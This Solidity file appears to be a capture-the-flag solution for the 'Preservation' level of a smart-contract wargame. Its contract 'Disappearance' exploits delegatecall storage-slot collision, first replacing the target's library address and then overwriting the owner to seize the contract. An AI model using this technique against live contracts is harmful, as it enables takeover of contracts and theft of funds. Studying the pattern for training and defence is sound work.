// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 16. PRESERVATION
 * @dev Claim ownership of the instance you are given.
 */

interface IPreservation {
    function owner() external view returns (address);

    function setFirstTime(uint256 _time) external;
}

contract Disappearance {
    address public timeZone1Library;
    address public preservation;
    address public owner;

    constructor(address _preservation) {
        preservation = _preservation;
    }

    function attack() public {
        // 1. Override the timeZone1Library address
        IPreservation(preservation).setFirstTime(
            uint256(uint160(address(this)))
        );
        // 1. Override the owner address
        IPreservation(preservation).setFirstTime(uint256(uint160(msg.sender)));
        require(
            IPreservation(preservation).owner() == msg.sender,
            "Hack failed!"
        );
    }

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}
